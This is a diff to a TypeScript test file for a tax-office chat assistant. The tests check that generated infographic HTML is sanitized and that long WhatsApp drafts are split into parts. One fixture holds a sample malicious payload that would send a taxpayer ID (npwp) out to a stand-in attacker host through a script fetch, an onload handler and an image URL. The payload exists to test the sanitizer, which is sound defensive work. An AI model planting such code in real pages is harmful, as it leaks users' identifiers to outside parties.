@@ -345,7 +345,7 @@ describe('asking AOS', () => {
     let res = await call('POST', `/api/conversations/${conv.id}/assistant/messages`, agent, { action: 'shorten', targetId: first.id });
     expect(res.statusCode).toBe(202);
     await idle();
-    expect(calls[1]!.request.prompt).toContain('Perpendek draf balasan berikut');
+    expect(calls[1]!.request.prompt).toContain('Perpendek teks berikut menjadi draf balasan');
     expect(calls[1]!.request.prompt).toContain('Aktivasi EFIN bisa lewat');
     // Sesi sebelumnya ikut dikirim agar permintaan lanjutan nyambung.
     expect(calls[1]!.request.prompt).toContain('Petugas: Jelaskan cara lapor SPT');
@@ -379,6 +379,87 @@ describe('asking AOS', () => {
     expect((await thread(conv.id)).messages.at(-1)).toMatchObject({ id: answer.id, status: 'cancelled', error: null });
     // Panggilan yang dibatalkan tidak dicatat sebagai kegagalan jalur.
     expect(await t.get().db.select().from(aiCalls)).toHaveLength(0);
+  });
+});
+
+describe('infographics and long drafts', () => {
+  it('keeps a designed infographic, stripped of scripts and outside addresses', async () => {
+    await setup();
+    await enable();
+    await receive(inbound.text('Cara lapor SPT keluarga bagaimana?'));
+    const conv = await conversation();
+    const html =
+      '<!doctype html><html><head><style>body{width:1080px;background:url(https://evil.example/bg.png)}</style>' +
+      '<script>fetch("https://evil.example")</script></head><body onload="x()"><h1>Lapor SPT Keluarga</h1>' +
+      '<img src="https://evil.example/p.png?npwp=[ID-1]"><svg><circle r="4"/></svg></body></html>';
+    respond = () => ({ text: `Infografis siap.\n<infografis>\n${html}\n</infografis>` });
+    await askText(conv.id, 'buatkan infografisnya');
+
+    const answer = (await thread(conv.id)).messages.at(-1)!.answer!;
+    expect(answer.infographic).toContain('<h1>Lapor SPT Keluarga</h1>');
+    expect(answer.infographic).toContain('<circle r="4"/>');
+    expect(answer.infographic).not.toMatch(/script|evil\.example|onload/);
+    expect(answer.draft).toBeNull();
+    // Instruksi memberi tahu model bahwa ia bisa membuat infografis sendiri.
+    expect(calls[0]!.request.system).toContain('<infografis>');
+    expect(calls[0]!.request.system).toContain('jangan pernah menjawab bahwa kamu tidak bisa membuat gambar');
+  });
+
+  it('turns an earlier answer into an infographic, or the chat topic when no answer is chosen', async () => {
+    await setup();
+    await enable();
+    await receive(inbound.text('Apa beda NPWP gabung dan pisah?'));
+    const conv = await conversation();
+    const first = (await askText(conv.id, 'Jelaskan bedanya'))[1]!;
+
+    let res = await call('POST', `/api/conversations/${conv.id}/assistant/messages`, agent, { action: 'infographic', targetId: first.id });
+    expect(res.statusCode).toBe(202);
+    expect((res.json() as { messages: AosMessageDTO[] }).messages[0]!.text).toBe('Buat infografis');
+    await idle();
+    expect(calls[1]!.request.prompt).toContain('Buat infografis yang menjelaskan isi jawaban berikut');
+    expect(calls[1]!.request.prompt).toContain('Aktivasi EFIN bisa lewat');
+
+    res = await call('POST', `/api/conversations/${conv.id}/assistant/messages`, agent, { action: 'infographic' });
+    expect(res.statusCode).toBe(202);
+    await idle();
+    expect(calls[2]!.request.prompt).toContain('Buat infografis tentang pokok pertanyaan WP');
+  });
+
+  it('splits a draft that is too long for one WhatsApp message into parts', async () => {
+    await setup();
+    await enable();
+    await receive(inbound.text('Tolong jelaskan lengkap kewajiban pajak keluarga'));
+    const conv = await conversation();
+    const para = (n: number) => `Poin ${n}. ` + 'Suami dan istri dihitung sebagai satu kesatuan dalam perpajakan. '.repeat(14);
+    const long = [1, 2, 3, 4, 5, 6, 7].map(para).join('\n\n');
+    respond = () => ({ text: `<draf>${long}</draf><keyakinan>sedang</keyakinan>` });
+    await askText(conv.id);
+    const answer = (await thread(conv.id)).messages.at(-1)!.answer!;
+    expect(answer.parts!.length).toBeGreaterThan(1);
+    for (const part of answer.parts!) expect(part.length).toBeLessThanOrEqual(4000);
+    expect(answer.parts!.join('\n\n')).toBe(long.trim());
+
+    // Draf yang ditulis model dalam beberapa bagian tetap dalam urutannya.
+    respond = () => ({ text: '<draf>(1/2) Bagian pertama.</draf>\n<draf>(2/2) Bagian kedua.</draf>' });
+    await askText(conv.id, 'Bagi jadi dua pesan');
+    const split = (await thread(conv.id)).messages.at(-1)!.answer!;
+    expect(split.parts).toEqual(['(1/2) Bagian pertama.', '(2/2) Bagian kedua.']);
+    expect(split.draft).toBe('(1/2) Bagian pertama.\n\n(2/2) Bagian kedua.');
+    expect(calls[0]!.request.system).toContain('4.096 karakter');
+  });
+
+  it('lets an answer written as plain text be shortened like a draft', async () => {
+    await setup();
+    await enable();
+    await receive(inbound.text('Mau tanya soal SPT'));
+    const conv = await conversation();
+    respond = () => ({ text: 'Penjelasan panjang untuk WP tentang SPT tahunan.' });
+    const first = (await askText(conv.id, 'Jelaskan kewajiban lapor keluarga'))[1]!;
+    respond = () => ({ text: ANSWER });
+    const res = await call('POST', `/api/conversations/${conv.id}/assistant/messages`, agent, { action: 'shorten', targetId: first.id });
+    expect(res.statusCode).toBe(202);
+    await idle();
+    expect(calls[1]!.request.prompt).toContain('Penjelasan panjang untuk WP tentang SPT tahunan.');
   });
 });
 
